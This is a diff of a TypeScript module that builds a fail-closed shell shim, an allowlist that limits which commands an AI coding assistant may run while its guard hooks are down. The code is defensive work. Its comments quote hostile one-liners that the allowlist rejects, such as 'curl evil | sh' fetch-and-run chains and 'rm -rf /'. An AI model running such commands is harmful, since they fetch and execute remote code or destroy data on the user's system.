@@ -1,9 +1,17 @@
 import * as fs from 'fs';
 import * as path from 'path';
 
-import { SyncFlowGuidance } from '@webpieces/rules-config';
+import { SyncFlowGuidance, CONFIG_FILENAME } from '@webpieces/rules-config';
 
 import { toError } from '../core/to-error';
+import {
+    L0_ALLOW_ERE, RECOVERY_CMD, INSTALL_HOOKS_CMD, UPGRADE_SHIM_CMD, RESTORE_SHIM_CMD,
+    INSTALL_HOOKS_ALLOW_JS, UPGRADE_SHIM_ALLOW_JS, RESTORE_SHIM_ALLOW_JS,
+} from './l0-allowlist';
+
+// The allowlist moved to ./l0-allowlist (this module was over the file-size limit); re-exported here so
+// every existing `from './shim'` import keeps working and there is still ONE name to import L0 by.
+export * from './l0-allowlist';
 
 // ---------------------------------------------------------------------------
 // The single checked-in shim (.claude/webpieces/ai-hook.sh). Both project hooks point at it, passing
@@ -32,200 +40,6 @@ export function shimPath(projectRoot: string): string {
     return path.join(projectRoot, '.claude', 'webpieces', 'ai-hook.sh');
 }
 
-// The OUTPUT-CAPTURE TAIL every escape hatch below tolerates — the 2026-07-21 deadlock report, part 2.
-// Every allowlist was anchored to a BARE command, but the way an AI assistant actually spells a
-// diagnostic command is `<cmd> 2>&1 | tail -20` (it trims the output it has to read back). The audit
-// log proves it: `.webpieces/logs/ai-hook-shim.log` has `pnpm install 2>&1 | tail -15` logged as
-// DENY-STALE seconds away from a bare `pnpm install` logged as ALLOW-INSTALL — the same cure, denied
-// for its redirection. A cure that is denied when spelled the natural way reads to the assistant as
-// "the guard blocks its own fix", which is exactly the conclusion it drew before handing the fix back
-// to the human.
-//
-// So each hatch accepts an OPTIONAL trailing stderr redirect (`2>&1` to fold stderr in, or `2>/dev/null`
-// to drop it — I hit the missing `2>/dev/null` case myself within the hour, running `pnpm install
-// 2>/dev/null | tail -2` against a drift block) and an OPTIONAL pipe into `tail`/`head` carrying at
-// most a line-count flag (`-20`, `-n 20`). Nothing else: the pipe target is one of two literal,
-// read-only pager words and its only argument is digits, so `| sh`, `| curl …`, `| tee /etc/x` and
-// every other operator stay DENIED. Spliced in place of each pattern's old `[[:space:]]*$` tail, so the
-// anchoring at both ends is unchanged. Keep in sync with CAPTURE_TAIL_JS_SRC (locked by a unit test).
-export const CAPTURE_TAIL_ERE =
-    '([[:space:]]+2>(&1|/dev/null))?([[:space:]]*\\|[[:space:]]*(tail|head)([[:space:]]+-(n[[:space:]]+)?[0-9]+)?)?[[:space:]]*$';
-
-// JS-regex-source twin of CAPTURE_TAIL_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
-export const CAPTURE_TAIL_JS_SRC =
-    '(\\s+2>(&1|\\/dev\\/null))?(\\s*\\|\\s*(tail|head)(\\s+-(n\\s+)?[0-9]+)?)?\\s*$';
-
-// The DIRECTORY PREFIX every escape hatch tolerates — the 2026-07-30 worktree deadlock.
-//
-// A Bash tool call does NOT persist `cd`: a standalone `cd <worktree>` followed by `pwd` in the next
-// call reports the primary clone again. So an agent working in a linked worktree can only reach that
-// tree with a self-contained `cd <worktree> && …`. The drift guard demanded a BARE `pnpm install`
-// ("do NOT put a cd in front of it") while the install was needed in the worktree — the cure was
-// literally untypable from the place that needed it, and a bare `cd <worktree>` was itself blocked.
-//
-// A leading `cd <path> &&` cannot change what the command does to a repo, so it is not a safety
-// concern; and this stays as un-smuggleable as the rest of the hatch, because the path token accepts
-// only path characters — no whitespace, no quote, no `$`, no backtick, and no shell operator. So
-// `cd /x && pnpm install` passes while `cd $(curl evil) && pnpm install`, `cd /x; rm -rf /` and
-// `cd /x && pnpm install && rm -rf /` all still FAIL CLOSED.
-// Keep in sync with CD_PREFIX_JS_SRC (locked by a unit test).
-export const CD_PREFIX_ERE = '(cd[[:space:]]+[A-Za-z0-9._/@~+-]+[[:space:]]*&&[[:space:]]*)?';
-
-// JS-regex-source twin of CD_PREFIX_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
-export const CD_PREFIX_JS_SRC = '(cd\\s+[A-Za-z0-9._\\/@~+-]+\\s*&&\\s*)?';
-
-// Every hatch below starts with the anchor + the optional `cd` prefix. Spliced in place of each
-// pattern's old bare `^`, so the anchoring at both ends is unchanged.
-const CD_PREFIX_ERE_ANCHORED = '^' + CD_PREFIX_ERE;
-const CD_PREFIX_JS_ANCHORED = '^' + CD_PREFIX_JS_SRC;
-
-// Package-manager install commands allowed to pass the fail-closed shim so the assistant can
-// self-heal the guards (run `pnpm install`) when node_modules is absent — otherwise the guard blocks
-// the very command that re-enables it (deadlock). nx/pnpm monorepo only. POSIX ERE (fed to `grep -E`).
-//
-// What's allowed (the realistic self-heal spellings — an earlier version only matched a bare
-// `pnpm install`, so `pnpm i` and `--flag=value` got fail-CLOSED and re-deadlocked the assistant):
-//   - pkg managers: pnpm | npm   (this nx monorepo uses pnpm; npm is accepted as the fallback. NOT
-//                                 yarn — this repo installs with pnpm/npm only, so yarn stays denied.)
-//   - subcommands:  install | i  (`pnpm i` / `npm i` is just shorthand for `install`)
-//   - flags:        zero or more `--flag` / `--flag=value` tokens (no whitespace, no operators)
-//
-// An optional LEADING `cd <path> &&` (CD_PREFIX_ERE) — added 2026-07-30. The old comment here argued a
-// `cd` is never needed because Claude Code starts at the repo root. That is false in a LINKED WORKTREE:
-// git copies no node_modules into a new worktree, so the very first call there needs an install in THAT
-// tree, and `cd` does not persist between tool calls, so `cd <worktree> && pnpm install` is the only
-// spelling that reaches it. Denying the prefix made the cure unreachable from the one place it was
-// needed. It widens nothing: the prefix cannot change what the install does, and the path token admits
-// no operator (see CD_PREFIX_ERE).
-//
-// Why it's un-smuggleable (the whole point of failing closed): the tail is anchored to `$` and only
-// accepts `--word` tokens, so no shell operator (`;`, `&&`, `|`, backticks, `$()`, `>`, `<`) can ride
-// along — `pnpm install && rm -rf /` and `pnpm install; curl evil | sh` still FAIL CLOSED.
-// Keep in sync with INSTALLER_ALLOW_JS below (locked by a unit test).
-export const INSTALLER_ALLOW_ERE =
-    CD_PREFIX_ERE_ANCHORED + '(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_ERE;
-
-// JS-regex twin of INSTALLER_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). The fail-closed shim (pure sh)
-// uses the ERE for the missing-bin case; the runner uses THIS twin (runBashInternal) so installer
-// commands also pass when the bin IS installed but the config is invalid/ahead of the validator —
-// same deadlock, other side. A unit test asserts the two agree on a sample set.
-export const INSTALLER_ALLOW_JS =
-    new RegExp(CD_PREFIX_JS_ANCHORED + '(pnpm|npm)\\s+(install|i)(\\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_JS_SRC);
-
-// The RECOVERY command, allowed alongside INSTALLER_ALLOW_ERE on every fail-closed path.
-//
-// Why a plain `pnpm install` is NOT enough (learned the hard way): when node_modules is CORRUPT — a
-// package half-written by an install that was killed mid-copy — pnpm sees a package dir carrying the
-// right version in its package.json, considers it installed, and SKIPS it. `pnpm install` cheerfully
-// reports "up to date" and the corruption survives every retry. The only reliable cure is to delete
-// node_modules so pnpm re-materializes the package from the (healthy) global store. So the fail-closed
-// escape hatch MUST allow the wipe too, or the assistant is left denying its own cure (deadlock).
-//
-// Kept as tight as INSTALLER_ALLOW_ERE: anchored at both ends, the ONLY shell operator accepted is a
-// single `&&` in exactly one position, and the rm target is literally `node_modules` — nothing else.
-// So `rm -rf /`, `rm -rf node_modules/../..`, `rm -rf node_modules; curl evil | sh` all stay DENIED.
-// Keep in sync with RECOVERY_ALLOW_JS below (locked by a unit test).
-export const RECOVERY_ALLOW_ERE =
-    CD_PREFIX_ERE_ANCHORED + 'rm[[:space:]]+-rf[[:space:]]+(\\./)?node_modules/?([[:space:]]*&&[[:space:]]*(pnpm|npm)[[:space:]]+(install|i)([[:space:]]+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?' + CAPTURE_TAIL_ERE;
-
-// JS-regex twin of RECOVERY_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
-export const RECOVERY_ALLOW_JS =
-    new RegExp(CD_PREFIX_JS_ANCHORED + 'rm\\s+-rf\\s+(\\.\\/)?node_modules\\/?(\\s*&&\\s*(pnpm|npm)\\s+(install|i)(\\s+--[A-Za-z][A-Za-z0-9=._/@:-]*)*)?' + CAPTURE_TAIL_JS_SRC);
-
-// The exact command we tell the human/assistant to run to recover a corrupt node_modules.
-export const RECOVERY_CMD = 'rm -rf node_modules && pnpm install';
-
-// Git SYNC commands, allowed ONLY on the version-DRIFT path (never for a missing/broken bin, which no
-// amount of git can fix). This closes a real deadlock, hit 2026-07-17:
-//
-// The drift guard was written for ONE direction — you `git pull`, the new package.json pins a NEWER
-// @webpieces, node_modules is still OLD, and `pnpm install` catches it up. But the comparison is a
-// plain `!=`, so it fires just as hard in the INVERSE case: check out a branch (or a local `main`)
-// that is BEHIND origin, and now the PIN is the stale side while node_modules is correct and NEWER.
-//
-// In that inverse case `pnpm install` is not the cure, it is the disease: it happily DOWNGRADES
-// node_modules to the stale pin. The real cure is `git pull` — which the guard denied, because the
-// allowlist only ever contained the installer. So the assistant was told to run the one command that
-// made things worse, while the fix was blocked. Allow the sync commands here and the deadlock is gone.
-//
-// Kept exactly as tight as INSTALLER_ALLOW_ERE: anchored at both ends, and every argument token is a
-// bare word or `--flag` — so no shell operator (`;`, `&&`, `|`, backticks, `$()`, `>`) can ride along.
-// `git pull; curl evil | sh` still FAILS CLOSED. Deliberately NOT `git checkout`: switching branches is
-// what CAUSES this drift, and a fail-closed escape hatch should only contain cures.
-// Keep in sync with SYNC_ALLOW_JS below (locked by a unit test).
-export const SYNC_ALLOW_ERE =
-    CD_PREFIX_ERE_ANCHORED + 'git[[:space:]]+(pull|fetch|merge)([[:space:]]+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_ERE;
-
-// JS-regex twin of SYNC_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
-export const SYNC_ALLOW_JS =
-    new RegExp(CD_PREFIX_JS_ANCHORED + 'git\\s+(pull|fetch|merge)(\\s+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*' + CAPTURE_TAIL_JS_SRC);
-
-// The CURE for the committed-shim self-guard (now enforced by the binary — see committedShimStale
-// below): regenerate .claude/webpieces/ai-hook.sh from renderShim(). Allowed while that guard is up —
-// like the installer, it is a webpieces-owned, no-network local action whose whole job is to re-arm the
-// guard, so denying it would deadlock the assistant against its own fix. Accepts the realistic spellings of the wp-upgrade-shim bin under
-// pnpm/npm/npx; anchored at both ends with only a bare bin name, so no shell operator can ride along.
-// Keep in sync with UPGRADE_SHIM_ALLOW_JS below (locked by a unit test).
-export const UPGRADE_SHIM_ALLOW_ERE =
-    CD_PREFIX_ERE_ANCHORED + '(pnpm|npm|npx)([[:space:]]+(exec|run))?[[:space:]]+wp-upgrade-shim' + CAPTURE_TAIL_ERE;
-
-// JS-regex twin of UPGRADE_SHIM_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
-export const UPGRADE_SHIM_ALLOW_JS =
-    new RegExp(CD_PREFIX_JS_ANCHORED + '(pnpm|npm|npx)(\\s+(exec|run))?\\s+wp-upgrade-shim' + CAPTURE_TAIL_JS_SRC);
-
-// The exact command we tell the assistant to run to regenerate a reverted/edited committed shim.
-export const UPGRADE_SHIM_CMD = 'pnpm exec wp-upgrade-shim';
-
-// The PRIMARY, version-AGNOSTIC cure for the self-guard — and the reason this exists (hit 2026-07-21):
-// the self-guard's deny used to name ONLY `pnpm exec wp-upgrade-shim`, but that bin ships in
-// @webpieces/ai-hook-rules >= 0.4.408. Every repo on an OLDER installed release — i.e. exactly the
-// repos that can hit this, since node_modules is what the shim compares itself against — got
-// "command not found" and was left with a hard block and no working cure. In the reporter's words, the
-// message gave "ZERO information" on how to actually fix it.
-//
-// A plain `cp` of the installed template over the committed shim has none of that version coupling:
-// templates/ai-hook.sh ships in EVERY release and is byte-identical to renderShim() (locked by a unit
-// test), which is exactly what the binary's committedShimStale() compares the committed shim against;
-// cp onto an existing file keeps the destination's mode, so the shim stays executable with no chmod.
-// It cures the block on any version, old or new —
-// which is why the deny now leads with it and only mentions the bin as the newer equivalent.
-//
-// Kept as tight as the other escape hatches: anchored at both ends, no flags, and BOTH paths are
-// literal webpieces-owned paths — so no other file can be read or written and no operator can ride
-// along. Keep in sync with RESTORE_SHIM_ALLOW_JS below (locked by a unit test).
-export const RESTORE_SHIM_ALLOW_ERE =
-    CD_PREFIX_ERE_ANCHORED + 'cp[[:space:]]+(\\./)?node_modules/@webpieces/ai-hook-rules/templates/ai-hook\\.sh[[:space:]]+(\\./)?\\.claude/webpieces/ai-hook\\.sh' + CAPTURE_TAIL_ERE;
-
-// JS-regex twin of RESTORE_SHIM_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
-export const RESTORE_SHIM_ALLOW_JS =
-    new RegExp(CD_PREFIX_JS_ANCHORED + 'cp\\s+(\\.\\/)?node_modules\\/@webpieces\\/ai-hook-rules\\/templates\\/ai-hook\\.sh\\s+(\\.\\/)?\\.claude\\/webpieces\\/ai-hook\\.sh' + CAPTURE_TAIL_JS_SRC);
-
-// The exact command the self-guard's deny tells the assistant to run. Works on EVERY installed version.
-export const RESTORE_SHIM_CMD =
-    'cp node_modules/@webpieces/ai-hook-rules/templates/ai-hook.sh .claude/webpieces/ai-hook.sh';
-
-// The THIRD cure for the self-guard, and the one with the longest shelf life: the installer itself.
-//
-// `wp-install-ai-hooks` has shipped in every release of this package since it created the shim (the
-// shim's own header line names it as the managing command), and install-entry.ts calls healShim()
-// FIRST, through the dependency-free ./shim module, before it lazily requires the rule engine. So it
-// re-arms the committed shim on a tree too broken to load setup.ts, exactly like wp-upgrade-shim, and
-// it does so on releases that predate wp-upgrade-shim (< 0.4.408) where that bin is not on disk at all.
-// That combination — always present AND a named bin rather than a raw file overwrite — is why the deny
-// now leads with it: the `cp` is version-agnostic too, but Claude Code's own permission classifier
-// treats a bare cp over a repo file as something to confirm, while a named bin reads as a tool call.
-//
-// Kept as tight as the other escape hatches: anchored at both ends, bare bin name, no flags, so no
-// shell operator can ride along. Keep in sync with INSTALL_HOOKS_ALLOW_JS below (locked by a unit test).
-export const INSTALL_HOOKS_ALLOW_ERE =
-    CD_PREFIX_ERE_ANCHORED + '(pnpm|npm|npx)([[:space:]]+(exec|run))?[[:space:]]+wp-install-ai-hooks' + CAPTURE_TAIL_ERE;
-
-// JS-regex twin of INSTALL_HOOKS_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts they agree.
-export const INSTALL_HOOKS_ALLOW_JS =
-    new RegExp(CD_PREFIX_JS_ANCHORED + '(pnpm|npm|npx)(\\s+(exec|run))?\\s+wp-install-ai-hooks' + CAPTURE_TAIL_JS_SRC);
-
-// The exact command the self-guard's deny names FIRST. Present in every release that has a shim.
-export const INSTALL_HOOKS_CMD = 'pnpm exec wp-install-ai-hooks';
 
 // ---------------------------------------------------------------------------
 // HOW EVERY DENY MUST SPELL ITS CURE (added 2026-07-23, from a live audit-log post-mortem).
@@ -366,31 +180,45 @@ const RUN_BIN_SH = `if [ -x "\$BIN" ] && [ -z "\$DRIFT_PKG" ]; then
 fi`;
 
 // Shell fragment: the guards are DOWN (missing | stale | crashed). Parse the payload, audit-log the
-// decision, and let ONLY the install/recovery commands through — everything else falls to the deny below.
+// decision, and let THE L0 ALLOWLIST through — everything else falls to the deny below.
+//
+// This asks the identical question isAllowed() asks in JS, in the same order: Read, then the
+// webpieces.config.json target, then the one command union (L0_ALLOW_ERE). The sh and JS halves exist
+// because D/X/K are decided BEFORE the bin runs (a stale/missing/broken validator cannot validate
+// itself) while S/C/Y are decided inside it — one model, two enforcement points.
+//
+// NOTE the documented asymmetry: here the bin is never executed, so an allowed Read is TERMINAL and
+// read-stale-guard does not run. In JS the same entry falls through and it does. See isAllowed().
 const TRIAGE_SH = `CMD="\$(printf '%s' "\$PAYLOAD" | sed -n 's/.*"command"[[:space:]]*:[[:space:]]*"\\([^"\\\\]*\\)".*/\\1/p')"
 TOOL="\$(printf '%s' "\$PAYLOAD" | sed -n 's/.*"tool_name"[[:space:]]*:[[:space:]]*"\\([^"\\\\]*\\)".*/\\1/p')"
+FILE="\$(printf '%s' "\$PAYLOAD" | sed -n 's/.*"file_path"[[:space:]]*:[[:space:]]*"\\([^"\\\\]*\\)".*/\\1/p')"
 # Best-effort audit trail of every decision the fail-closed shim makes WHILE THE GUARDS ARE DOWN, so a
 # human can inspect after something odd (an install that was denied, or one that slipped through). One
 # tab-separated line per call → <root>/.webpieces/logs/ai-hook-shim.log (gitignored). NEVER breaks or
 # blocks the hook: all writes are best-effort (|| true) and go to a file, never to stdout (stdout is
 # the PreToolUse decision channel — a stray byte there would corrupt allow/deny).
 LOG_DIR="\$ROOT/.webpieces/logs"
-wp_log() {                   # \$1 = decision label (ALLOW-INSTALL | DENY | DENY-STALE | DENY-BROKEN)
+wp_log() {                   # \$1 = label (ALLOW-CURE|ALLOW-READ|ALLOW-CONFIG|DENY|DENY-STALE|DENY-BROKEN)
   { mkdir -p "\$LOG_DIR" 2>/dev/null && printf '%s\\t%s\\t%s\\t%s\\t%s\\n' "\$(date '+%Y-%m-%dT%H:%M:%S%z' 2>/dev/null)" "\$BIN_NAME" "\$TOOL" "\$1" "\$CMD" >> "\$LOG_DIR/ai-hook-shim.log"; } 2>/dev/null || true
 }
 DENY_LABEL="DENY"
 [ -n "\$DRIFT_PKG" ] && DENY_LABEL="DENY-STALE"        # version drift, not a missing bin
 [ -n "\$BROKEN_BIN" ] && DENY_LABEL="DENY-BROKEN"      # bin present but CRASHED (corrupt node_modules)
-if printf '%s' "\$CMD" | grep -Eq '${INSTALLER_ALLOW_ERE}' || printf '%s' "\$CMD" | grep -Eq '${RECOVERY_ALLOW_ERE}'; then
-  wp_log ALLOW-INSTALL       # record the self-heal we let through (re-enables the guards)
-  exit 0                     # allow the installer/recovery so the assistant can break the deadlock
-fi
-# DRIFT ONLY: let the git sync commands through. When the PIN is the stale side (a checkout behind
-# origin), 'pnpm install' DOWNGRADES and 'git pull' is the only cure — denying it deadlocks the
-# assistant against its own fix. Pointless for a missing/broken bin, so it stays gated on drift.
-if [ -n "\$DRIFT_PKG" ] && printf '%s' "\$CMD" | grep -Eq '${SYNC_ALLOW_ERE}'; then
-  wp_log ALLOW-SYNC          # record the git sync we let through (may be what re-syncs the pin)
+# THE L0 ALLOWLIST, entry order identical to isAllowed(). No fault is consulted: a cure that cannot
+# help a given fault also cannot hurt it, and gating each entry on a fault is what produced the four
+# defects recorded above L0_ALLOW_ERE.
+if [ "\$TOOL" = "Read" ]; then
+  wp_log ALLOW-READ          # you must be able to read to work out how to fix this
   exit 0
+fi
+case "\$FILE" in
+  */${CONFIG_FILENAME}|${CONFIG_FILENAME})
+    wp_log ALLOW-CONFIG      # the always-allowed recovery target — every guard is configured from it
+    exit 0 ;;
+esac
+if printf '%s' "\$CMD" | grep -Eq '${L0_ALLOW_ERE}'; then
+  wp_log ALLOW-CURE          # record the self-heal we let through (re-enables the guards)
+  exit 0                     # allow the cure so the assistant can break the deadlock
 fi
 wp_log "\$DENY_LABEL"         # every fail-closed block (…-STALE = drift, …-BROKEN = crash) for inspection`;
 
@@ -434,14 +262,14 @@ elif [ -n "\$DRIFT_PKG" ]; then
   # It used to name 'git merge --ff-only origin/main' and assert that merge is allowed while this guard
   # is up — the ONE command redirect-how-to-merge-main blocks in every form. An AI that obeyed the
   # drift message got hard-blocked by the other guard with no path forward, which is how improvised
-  # 'git reset --hard' workarounds get invented. (NOTE: the shim's SYNC allowlist does let merge
-  # through here, because the guards are DOWN — that is exactly why the text must not recommend it.)
+  # 'git reset --hard' workarounds get invented. The SYNC allowlist no longer accepts merge either, so
+  # the text and the allowlist now agree instead of the text warning against what the list permits.
   #
   # State the two versions and let the reader judge which is stale — do NOT assert a direction. The
   # check is a plain !=, so it fires BOTH ways, and the old text always claimed node_modules was the
   # older side. When it is actually the NEWER side (a checkout behind origin), that text sent people
   # to 'pnpm install', which DOWNGRADES them further from correct.
-  REASON="❌ webpieces version drift: package.json pins \$DRIFT_PKG@\$DRIFT_DECLARED but node_modules has \$DRIFT_INSTALLED. Every OTHER call is blocked until they agree. WHICH ONE IS STALE decides which option is yours - compare the two versions above. OPTION 1 (the pin is NEWER than node_modules - you just pulled or switched to a branch pinning a newer webpieces) - run EXACTLY this command to catch node_modules up: 'pnpm install'. OPTION 2 (the pin is OLDER than node_modules - your checkout is behind origin, so the PIN is the stale side, and 'pnpm install' on its own would DOWNGRADE you) - get the checkout current FIRST, THEN run 'pnpm install'. ${new SyncFlowGuidance().updateMainAdvice()} git pull and git fetch are allowed while this guard is up and are the cure here. Do not reach for git merge: this guard lets it through only because the guards are DOWN, and the moment they come back redirect-how-to-merge-main blocks it in every form. ${NO_CHAINING_RULE}"
+  REASON="❌ webpieces version drift: package.json pins \$DRIFT_PKG@\$DRIFT_DECLARED but node_modules has \$DRIFT_INSTALLED. Every OTHER call is blocked until they agree. WHICH ONE IS STALE decides which option is yours - compare the two versions above. OPTION 1 (the pin is NEWER than node_modules - you just pulled or switched to a branch pinning a newer webpieces) - run EXACTLY this command to catch node_modules up: 'pnpm install'. OPTION 2 (the pin is OLDER than node_modules - your checkout is behind origin, so the PIN is the stale side, and 'pnpm install' on its own would DOWNGRADE you) - get the checkout current FIRST, THEN run 'pnpm install'. ${new SyncFlowGuidance().updateMainAdvice()} git pull and git fetch are allowed while this guard is up and are the cure here. git merge is NOT allowed - not by this guard and not by redirect-how-to-merge-main once the guards are back - because main is merged ONLY through the 3-point fork merge: 'pnpm wp-start-update', or 'pnpm wp-start-upsert-pr' when a PR is already open. ${NO_CHAINING_RULE}"
 else
   # A LINKED WORKTREE is the overwhelmingly common way to land here with a perfectly healthy repo:
   # git gives the new worktree a .git FILE (the primary clone has a .git directory) and copies no
@@ -517,6 +345,15 @@ export function findShimRoot(cwd: string): string | null {
 // Best-effort: keep the committed shim identical to renderShim() so the fail-closed escape hatch and
 // allowlist never drift. Only rewrites an EXISTING shim (never creates one) so global installs are
 // untouched. NEVER throws — a self-heal must never block or crash a tool call.
+//
+// The overwrite itself is correct and deliberate — shim and binary are two halves of one L0 and MUST
+// come from the same release (see shimStaleRecoveryDecision's header in ../adapters/hook-core).
+//
+// It needs no backup and no notice: the shim is a TRACKED file, so whatever it replaced is already in
+// git — `git diff` shows the rewrite, and a tamper is a working-tree modification git surfaces on its
+// own. In a consistent repo this is a no-op (committed shim already equals renderShim()); it earns its
+// keep on the upgrade path, where bumping the pin and installing leaves the committed shim behind and
+// this quietly brings it forward to be committed.
 export function healShim(cwd: string): void {
     // eslint-disable-next-line @webpieces/no-unmanaged-exceptions
     try {
